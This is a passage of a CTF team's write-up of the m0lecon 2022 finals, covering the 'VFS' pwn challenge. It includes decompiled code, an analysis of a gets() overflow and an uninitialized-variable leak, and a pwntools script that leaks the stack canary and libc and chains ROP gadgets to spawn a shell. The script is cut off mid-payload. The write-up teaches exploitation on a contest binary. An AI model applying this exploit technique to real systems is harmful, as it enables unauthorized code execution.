@@ -1,0 +1,227 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Attack Defence TODO
+King Of The Hill (KOTH) TODO
+Speedruns The CTF featured a number of four speedrun challenges, which were Jeopardy-style challenges released every 2 hours. Unfortunately, we only solved the second one, but we got really close to solve the first one too!
+Unfortunately, as the first one was related to making a scanner (which was on-site) scan an image, we cannot really try to solve it afterward the CTF ended 😔."><meta name=keywords content="Block,Hackers,CTF,CTF,m0lecon,finals,AttackDefence"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://madrhacks.github.io/writeups/m0lecon_finals_2022/><title>m0lecon finals 2022 :: MadrHacks — A lodge of Ethical Hackers</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://madrhacks.github.io/main.min.cf2feab91842b47fcc27f6ec2324f47128f7f3e5b55ec73b78b4795b15cc662e.css integrity="sha256-zy/quRhCtH/MJ/bsIyT0cSj38+W1Xsc7eLR5WxXMZi4="><meta itemprop=name content="m0lecon finals 2022"><meta itemprop=description content="Attack Defence TODO
+King Of The Hill (KOTH) TODO
+Speedruns The CTF featured a number of four speedrun challenges, which were Jeopardy-style challenges released every 2 hours. Unfortunately, we only solved the second one, but we got really close to solve the first one too!
+Unfortunately, as the first one was related to making a scanner (which was on-site) scan an image, we cannot really try to solve it afterward the CTF ended 😔."><meta itemprop=datePublished content="2022-11-18T00:00:00+00:00"><meta itemprop=dateModified content="2022-11-18T00:00:00+00:00"><meta itemprop=wordCount content="1090"><meta itemprop=image content="https://madrhacks.github.io"><meta itemprop=keywords content="CTF,m0lecon,finals,AttackDefence,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://madrhacks.github.io"><meta name=twitter:title content="m0lecon finals 2022"><meta name=twitter:description content="Attack Defence TODO
+King Of The Hill (KOTH) TODO
+Speedruns The CTF featured a number of four speedrun challenges, which were Jeopardy-style challenges released every 2 hours. Unfortunately, we only solved the second one, but we got really close to solve the first one too!
+Unfortunately, as the first one was related to making a scanner (which was on-site) scan an image, we cannot really try to solve it afterward the CTF ended 😔."><meta property="article:published_time" content="2022-11-18 00:00:00 +0000 UTC"><link rel=stylesheet href=https://madrhacks.github.io/custom.min.d2b8de14cdbd978d02fa505b7e22808ee7a1babfa264242aa6bcd257ee3960d6.css integrity="sha256-0rjeFM29l40C+lBbfiKAjuehur+iZCQqprzSV+45YNY="></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a class=logo href=https://madrhacks.github.io><img id=logo-header src=https://madrhacks.github.io/svg/logo-m-green.svg>
+<span class=logo-brand>adrHacks</span></a>
+<span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://madrhacks.github.io/about>About</a></li><li><a href=https://madrhacks.github.io/posts>Blog</a></li><li><a href=https://madrhacks.github.io/resource>Resources</a></li><li><a href=https://madrhacks.github.io/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><article><h1 class=post-title><a href=https://madrhacks.github.io/writeups/m0lecon_finals_2022/>m0lecon finals 2022</a></h1><div class=post-meta><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>18 November, 2022</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://madrhacks.github.io/tags/ctf>CTF</a></span><span class=tag><a href=https://madrhacks.github.io/tags/m0lecon>m0lecon</a></span><span class=tag><a href=https://madrhacks.github.io/tags/finals>finals</a></span><span class=tag><a href=https://madrhacks.github.io/tags/attackdefence>AttackDefence</a></span></p></div><div class=post-content><h1 id=attack-defence>Attack Defence</h1><p>TODO</p><h1 id=king-of-the-hill-koth>King Of The Hill (KOTH)</h1><p>TODO</p><h1 id=speedruns>Speedruns</h1><p>The CTF featured a number of four speedrun challenges, which were Jeopardy-style challenges released every 2 hours. Unfortunately, we only solved the second one, but we got really close to solve the first one too!</p><p>Unfortunately, as the first one was related to making a scanner (which was on-site) scan an image, we cannot really try to solve it afterward the CTF ended 😔.</p><h2 id=vfs---speedrun-2-kalexauthorskalex>VFS - Speedrun 2 (<a href=https://madrhacks.github.io/authors/kalex>kalex</a>)</h2><h3 id=exploration>Exploration</h3><p>This pwn challenge was pretty interesting, as it was illustrating how it is (kinda) possible to use the stack to allocate memory dynamically (spoiler alert: don&rsquo;t <em><strong>ever</strong></em> do it for real). The binary and other files that came with it are available <a href=https://madrhacks.github.io/downloadables/m0lecon_finals_2022_vfs.zip>here</a>.</p><p>The binaries&rsquo; protections are the following (checksec output):</p><pre tabindex=0><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre><p>The binary was fairly simple. The decompiled version from <a href=https://ghidra-sre.org/>Ghidra</a> is the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// This is actually not as complex as it looks, but as this
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// function does not follow the normal calling convention and
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// stack setup, Ghidra doesn&#39;t really understand what&#39;s going
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// on really well
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>demo</span>(<span style=color:#66d9ef>long</span> size)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> canary;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> <span style=color:#f92672>-</span>size;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#f92672>-</span>size <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>size;
+</span></span><span style=display:flex><span>  canary <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Please insert your string!&#34;</span>);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span>  gets(<span style=color:#f92672>&amp;</span>stack0x00000000 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>size);
+</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(undefined <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>canary <span style=color:#f92672>+</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(<span style=color:#f92672>&amp;</span>stack0xfffffffffffffff8 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>size) <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>size) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>  print_result((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>stack0x00000000 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>size);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (canary <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+</span></span><span style=display:flex><span>    __stack_chk_fail();
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>VFS</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> size;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> canary;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  canary <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;How big of an array you want to make?&#34;</span>);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span>  size <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  __isoc99_scanf(<span style=color:#e6db74>&#34;%lu&#34;</span>,<span style=color:#f92672>&amp;</span>size);
+</span></span><span style=display:flex><span>  getchar();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((size <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>||</span> (<span style=color:#ae81ff>0x1ff</span> <span style=color:#f92672>&lt;</span> size)) {
+</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;Let</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>s not break our necks here...&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    size <span style=color:#f92672>=</span> (size <span style=color:#f92672>-</span> size <span style=color:#f92672>%</span> <span style=color:#ae81ff>0x10</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>;
+</span></span><span style=display:flex><span>    demo(size);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (canary <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+</span></span><span style=display:flex><span>    __stack_chk_fail();
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>stats</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> choice;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  undefined8 rating;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> local_178 [<span style=color:#ae81ff>360</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> canary;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  canary <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Hello! This demo was proven faster than mallocs, in every test environment available.&#34;</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;90% of the developers who used this app found this approach more useful than mallocs&#34;</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Our company found a 60% revenue increase after switching all our products to VSF&#34;</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;You can get our VSF ready kit for only 13370$&#34;</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Can you please leave a rating? (y/n)&#34;</span>);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span>  choice <span style=color:#f92672>=</span> getchar();
+</span></span><span style=display:flex><span>  getchar();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((<span style=color:#66d9ef>char</span>)choice <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;y&#39;</span>) {
+</span></span><span style=display:flex><span>    puts(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;VFS allows us to have ratings between 0 and 18446744073709551615, unlike mallocs approaches , which is usually limited to 5 (in all testing environments)&#34;</span>
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span>    __isoc99_scanf(<span style=color:#e6db74>&#34;%lu&#34;</span>,<span style=color:#f92672>&amp;</span>rating);
+</span></span><span style=display:flex><span>    getchar();
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;At least leave us a review pls&#34;</span>);
+</span></span><span style=display:flex><span>    putchar(<span style=color:#ae81ff>0x3e</span>);
+</span></span><span style=display:flex><span>    fgets(local_178,<span style=color:#ae81ff>0x15d</span>,stdin);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Your rating of %lu was recorded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,rating);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (canary <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+</span></span><span style=display:flex><span>    __stack_chk_fail();
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> choice;
+</span></span><span style=display:flex><span>  undefined8 local_10;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(undefined8 <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  setBuffs();
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Welcome to VSF demo!&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>( true ) {
+</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;Main menu&#34;</span>);
+</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;1. Test variable size frames&#34;</span>);
+</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;2. Print stats which proves this approach is better than malloc&#34;</span>);
+</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;3. Exit&#34;</span>);
+</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span>    read(<span style=color:#ae81ff>0</span>,<span style=color:#f92672>&amp;</span>choice,<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    getchar();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (choice <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;3&#39;</span>) <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (choice <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;1&#39;</span>) {
+</span></span><span style=display:flex><span>      VFS();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (choice <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;2&#39;</span>) {
+</span></span><span style=display:flex><span>      stats();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Hope you enjoyed this demo, and please stop using malloc :)&#34;</span>);
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+</span></span><span style=display:flex><span>  exit(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>If you are wondering what the <code>demo</code> function does, it is useful to look at the assembly. A standard function prologue looks like the following (intel syntax):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rbp</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rbp</span>,<span style=color:#66d9ef>rsp</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span>    <span style=color:#66d9ef>rsp</span>,<span style=color:#ae81ff>0x180</span>
+</span></span></code></pre></div><p>The space allocated on the stack for the local variables (using <code>sub rsp, &lt;n></code>) is statically defined. In <code>demo</code>, however, the prologue is the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rbp</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rbp</span>,<span style=color:#66d9ef>rsp</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span>    <span style=color:#66d9ef>rsp</span>,<span style=color:#66d9ef>rdi</span>
+</span></span></code></pre></div><p>where the space allocated is dynamically defined using <code>rdi</code>, which is the first argument passed to the function.</p><p>There are two vulnerabilities. The first one is obvious, and derives from the usage of <code>gets</code>. Notice, however, that we cannot leak the canary, as <code>gets</code> puts a null byte at the end of our input, preventing string-reading functions to leak it.</p><p>The second vulnerability is a little more subtle. Notice that the <code>rating</code> variable in <code>stats</code> is never initialized if we do not enter the if, but it still gets printed out anyway at the end. This means that we can leak stuff on the stack!</p><h3 id=exploitation>Exploitation</h3><p>We can use the second vulnerability to leak stuff from the binary. The easier way to see what we can get is to try every possible combination of calls to <code>VFS</code>, followed by a <code>stats</code>. In each <code>VFS</code> call, we will change the size of the stack allocation, therefore changing the stack (and possibly what&rsquo;s leaked by <code>stats</code>).</p><p>We can then simply print out the leaks, find out what it prints (in this case, both the canary and a libc address is printed, allowing us to use the whole libc to pop a shell).</p><p>We can then simply build a ropchain to pop a shell using a one_gadget (and some gadgets to fulfill its constraints.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./vfs_patched&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc.so.6&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;kitty&#34;</span>]
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>(<span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path], gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#f92672>**</span>kw)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path], <span style=color:#f92672>**</span>kw)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>vfs</span>(size, data<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span>):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> io
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;1&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>, str(size)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>, data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>stats</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> io
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;2&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;n&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&gt;&#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;AAAA&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;rating of &#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> int(io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34; &#34;</span>)[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> io
+</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> conn(level<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;debug&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># good luck pwning :)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Bruteforce the possible leaks</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># for i in range(2, 0x200):</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#     vfs(i)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#     print(i, hex(stats()))</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Leak canary</span>
+</span></span><span style=display:flex><span>    vfs(<span style=color:#ae81ff>288</span>)
+</span></span><span style=display:flex><span>    canary <span style=color:#f92672>=</span> stats()
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;canary: </span><span style=color:#e6db74>{</span>hex(canary)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Leak libc</span>
+</span></span><span style=display:flex><span>    vfs(<span style=color:#ae81ff>144</span>)
+</span></span><span style=display:flex><span>    libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> stats() <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x216600</span>
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;libc @ </span><span style=color:#e6db74>{</span>hex(libc<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Get a shell</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># To use the one_gadget found, we need to set a couple of registers first</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 0xebcf8 execve(&#34;/bin/sh&#34;, rsi, rdx)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># constraints:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   address rbp-0x78 is writable</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rsi] == NULL || rsi == NULL</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#   [rdx] == NULL || rdx == NULL</span>
+</span></span><span style=display:flex><span>    rop <span style=color:#f92672>=</span> ROP(libc)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x00000000000DA97D</span>)  <span style=color:#75715e># pop rsi; ret;</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x000000000011F497</span>)  <span style=color:#75715e># pop rdx; pop r12; ret</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xEBCF8</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> flat(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>,  <span style=color:#75715e># padding</span>
+</span></span><span style=display:flex><span>        canary,  <span style=color:#75715e># canary</span>
